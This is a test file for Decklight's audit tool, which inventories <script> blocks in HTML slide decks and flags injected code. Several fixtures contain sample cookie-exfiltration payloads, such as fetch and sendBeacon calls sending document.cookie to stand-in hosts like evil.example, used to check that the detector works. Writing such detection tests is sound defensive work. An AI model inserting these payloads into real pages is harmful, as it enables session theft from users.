// Copyright 2026 Gilles Philippart
// SPDX-License-Identifier: Apache-2.0

// The ingredients label (MARKETPLACE.md PRESENT#AUDIT). Two things have to
// hold at once and pull against each other: every executing block is named,
// and nothing inert is. A label that cried wolf on cast JSON would be turned
// off within a day, and one that missed an appended <script> is worse than
// none — so the false-positive tests carry as much weight here as the attack.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { readFileSync, writeFileSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { classifyScripts, auditDeck, formatLabel, isBootCall, runtimeVersion, installedRuntime } from '../cli/audit.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(here, '..');
const CLI = path.join(ROOT, 'cli/decklight.mjs');

const kinds = (html) => classifyScripts(html).map((b) => b.kind);

// ── what each block IS ─────────────────────────────────────────────────────

test('the runtime is found by its marker, and by shape when unmarked', () => {
  const marked = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script>Decklight.init()</script>`;
  assert.deepEqual(kinds(marked), ['runtime', 'boot']);

  // bundle writes a BARE <script> for the runtime, so the fallback locator
  // (upgrade's, shared) is the common path, not the exotic one
  const bare = `<script>var Decklight = {}</script>
<script>Decklight.init()</script>`;
  assert.deepEqual(kinds(bare), ['runtime', 'boot']);
});

test('a source deck loads the runtime by src, and says so', () => {
  const html = `<script src="../dist/decklight.js"></script><script>Decklight.init()</script>`;
  assert.deepEqual(kinds(html), ['runtime-src', 'boot']);
  const r = auditDeck(html).runtime;
  assert.equal(r.kind, 'external');
  assert.equal(r.state, 'not-inlined', 'a file we never see is not a file we can hash');
});

test('JSON and template blocks are data, not findings', () => {
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script type="application/json" id="cast-one">{"v":2}</script>
<script type="application/json" data-decklight-visemes="slide-01">{}</script>
<script type="application/json" data-decklight-voices="v/m.json">{}</script>
<script type="text/template">## not markup the browser runs</script>
<script>Decklight.init()</script>`;
  const report = auditDeck(html);
  assert.equal(report.counts.data, 3);
  assert.equal(report.counts.template, 1);
  assert.equal(report.counts.unaccounted, 0, 'no browser executes any of those');
  assert.deepEqual(
    classifyScripts(html).filter((b) => b.kind === 'data').map((b) => b.subtype),
    ['cast', 'visemes', 'voice manifest']);
});

test('theme <style> blocks are counted as inventory, never as script', () => {
  const html = `<head><style data-decklight-runtime="css">.decklight{}</style>
<style data-theme="aurora">a{}</style><style data-theme="midnight">b{}</style></head>
<body><script data-decklight-runtime="js">var Decklight = {}</script></body>`;
  assert.equal(auditDeck(html).themes, 2);
});

// ── the boot call: matched by shape, not by mention ─────────────────────────

test('isBootCall accepts what the scaffolder writes', () => {
  assert.ok(isBootCall('Decklight.init()'));
  assert.ok(isBootCall('Decklight.init({ transition: "fade" });'));
  assert.ok(isBootCall('const deck = Decklight.init({\n  pinTitles: true,\n});'));
  assert.ok(isBootCall('// a leading comment\nDecklight.init();'));
  assert.ok(isBootCall('/* block */ Decklight.init({ a: ")" });'), 'a paren in a string does not end the call');
});

test('isBootCall refuses anything riding along after the call', () => {
  // the whole reason it is a shape test: "mentions Decklight.init" would pass
  // every one of these
  assert.equal(isBootCall('Decklight.init(); fetch("//evil")'), false);
  assert.equal(isBootCall('fetch("//evil"); Decklight.init()'), false);
  assert.equal(isBootCall('Decklight.init()\ndocument.cookie'), false);
  assert.equal(isBootCall('if (x) Decklight.init()'), false);
});

test('an init block with extra code is unaccounted, not boot', () => {
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script>Decklight.init(); navigator.sendBeacon("//evil", document.cookie)</script>`;
  const report = auditDeck(html);
  assert.equal(report.counts.boot, 0);
  assert.equal(report.counts.unaccounted, 1);
  assert.match(report.unaccounted[0].snippet, /sendBeacon/);
});

// ── the attack the whole wave exists for ───────────────────────────────────

test('an appended <script> is named with its line and its opening bytes', () => {
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script>Decklight.init()</script>
<script>fetch("//evil.example/" + document.cookie)</script>`;
  const report = auditDeck(html);
  assert.equal(report.counts.unaccounted, 1);
  const [found] = report.unaccounted;
  assert.equal(found.line, 3, 'the coordinate a person can act on');
  assert.match(found.snippet, /evil\.example/);
  assert.ok(found.bytes > 0);
});

test('a third-party src= is named too — it executes and it is not ours', () => {
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script src="https://cdn.example/analytics.js"></script>
<script>Decklight.init()</script>`;
  const report = auditDeck(html);
  assert.equal(report.counts.unaccounted, 1);
  assert.match(report.unaccounted[0].snippet, /cdn\.example/);
});

test('a script hiding behind an unknown type is still named', () => {
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script type="text/javascript ">fetch("//evil")</script>`;
  assert.equal(auditDeck(html).counts.unaccounted, 1);
});

// ── the false positives that would kill it ─────────────────────────────────

test('a comment that TALKS about <script> is not a script block', () => {
  // demo/smoke.html's slide-15 comment says "its text lives inside a <script>",
  // and a raw scan pairs that mention with the real </script> below it,
  // inventing a block that spans the gap — a phantom finding on a clean deck.
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<!-- its text lives inside a <script>, which the math scanner skips -->
<script type="application/json" id="cast-one">{"v":2}</script>
<script>Decklight.init()</script>`;
  const report = auditDeck(html);
  assert.equal(report.counts.unaccounted, 0);
  assert.equal(report.counts.data, 1);
});

test('every shipped deck reports only its own author script — no phantoms', () => {
  // The decks npm run verify renders. Their genuine author blocks (the
  // showcase quiz, smoke's probes) SHOULD be named — that is the label
  // working. What must not appear is a finding pointing at data or comments.
  for (const rel of ['demo/intro.html', 'demo/showcase.html', 'demo/smoke.html']) {
    const report = auditDeck(readFileSync(path.join(ROOT, rel), 'utf8'));
    for (const b of report.unaccounted) {
      assert.ok(b.bytes > 0, `${rel}:${b.line} — a zero-byte finding is a parse artifact`);
      assert.doesNotMatch(b.snippet, /^[,)\]}]/, `${rel}:${b.line} — a finding starting mid-expression is a mis-paired match`);
    }
    assert.ok(report.counts.data > 0, `${rel} has cast/manifest JSON, and it is counted as data`);
  }
  assert.equal(auditDeck(readFileSync(path.join(ROOT, 'demo/intro.html'), 'utf8')).counts.unaccounted, 0,
    'intro.html carries no author script at all');
});

// ── the runtime hash ───────────────────────────────────────────────────────

test('the version is read from the build banner', () => {
  assert.equal(runtimeVersion('/*! Decklight v1.2.3 — Copyright */ var Decklight'), '1.2.3');
  assert.equal(runtimeVersion('<p>no runtime here</p>'), null);
});

test('a deck bundled from this install hashes identical to it', () => {
  const installed = installedRuntime();
  assert.ok(installed, 'dist/ is built (npm run build) — the comparison needs something to compare to');
  const html = `<script>${installed.text}</script><script>Decklight.init()</script>`;
  const r = auditDeck(html).runtime;
  assert.equal(r.state, 'matches');
  assert.equal(r.hash, installed.hash);
});

test('a tampered runtime of the same version reads as differing, not matching', () => {
  const installed = installedRuntime();
  const html = `<script>${installed.text}\n/* injected */</script><script>Decklight.init()</script>`;
  const r = auditDeck(html).runtime;
  assert.equal(r.state, 'differs');
  assert.notEqual(r.hash, installed.hash);
});

test('a runtime from another version is reported as not comparable, not as a mismatch', () => {
  // The honest three-valued answer. This package can vouch for the build it
  // ships and nothing else; calling an older release "DIFFERS" would read as
  // an accusation against a perfectly good deck.
  const installed = installedRuntime();
  const html = `<script>/*! Decklight v0.0.1 */ var Decklight = {}</script><script>Decklight.init()</script>`;
  const r = auditDeck(html, { installed }).runtime;
  assert.equal(r.state, 'other-version');
  assert.equal(r.version, '0.0.1');
});

// ── an inventory, never a verdict ──────────────────────────────────────────

test('the label states what is there and never grades it', () => {
  const clean = `<script data-decklight-runtime="js">var Decklight = {}</script><script>Decklight.init()</script>`;
  const dirty = clean + '<script>fetch("//evil")</script>';
  for (const html of [clean, dirty]) {
    const text = formatLabel(auditDeck(html)).join('\n');
    assert.doesNotMatch(text, /\bsafe\b|\bclean\b|\btrusted\b|\bverified\b|\bsecure\b/i,
      'no verdict vocabulary — the scan is a heuristic over a file someone may have edited');
    assert.doesNotMatch(text, /[✔✓✅❌⚠]/, 'and no check marks either');
  }
  assert.match(formatLabel(auditDeck(clean)).join('\n'), /0 unaccounted script blocks/,
    'a clean deck gets a count, not a blessing');
});

// ── the CI face ────────────────────────────────────────────────────────────

const run = (args) => {
  try {
    return { code: 0, out: execFileSync(process.execPath, [CLI, ...args], { encoding: 'utf8', stdio: 'pipe' }) };
  } catch (e) { return { code: e.status, out: String(e.stdout) + String(e.stderr) }; }
};

test('--check exits 0 on a deck that runs only the runtime', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'decklight-audit-'));
  const deck = path.join(dir, 'talk.html');
  const installed = installedRuntime();
  writeFileSync(deck, `<div class="decklight"></div><script>${installed.text}</script><script>Decklight.init()</script>`);
  const { code, out } = run(['present', '--check', deck]);
  rmSync(dir, { recursive: true, force: true });
  assert.equal(code, 0);
  assert.match(out, /identical to this install/);
  assert.match(out, /0 unaccounted/);
});

test('--check exits non-zero and names the block, from any directory', () => {
  // deliberately outside the cwd: --check reads one file and serves nothing,
  // so the server's "deck must live under the current directory" rule must
  // not apply to it
  const dir = mkdtempSync(path.join(tmpdir(), 'decklight-audit-'));
  const deck = path.join(dir, 'talk.html');
  writeFileSync(deck, `<script>var Decklight = {}</script><script>Decklight.init()</script>
<script>fetch("//evil.example/" + document.cookie)</script>`);
  const { code, out } = run(['present', '--check', deck]);
  rmSync(dir, { recursive: true, force: true });
  assert.equal(code, 1);
  assert.match(out, /1 unaccounted script block/);
  assert.match(out, /line\s+2\s+.*evil\.example/);
});

test('--check on a real bundled deck is quiet, and loud once tampered with', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'decklight-audit-'));
  const deck = path.join(dir, 'talk.html');
  const bundled = run(['bundle', path.join(ROOT, 'demo/intro.html'), '-o', deck]);
  assert.equal(bundled.code, 0, bundled.out);

  const before = run(['present', '--check', deck]);
  assert.equal(before.code, 0, before.out);
  assert.match(before.out, /0 unaccounted/);

  writeFileSync(deck, readFileSync(deck, 'utf8') + '\n<script>alert(1)</script>\n');
  const after = run(['present', '--check', deck]);
  rmSync(dir, { recursive: true, force: true });
  assert.equal(after.code, 1);
  assert.match(after.out, /alert\(1\)/);
});
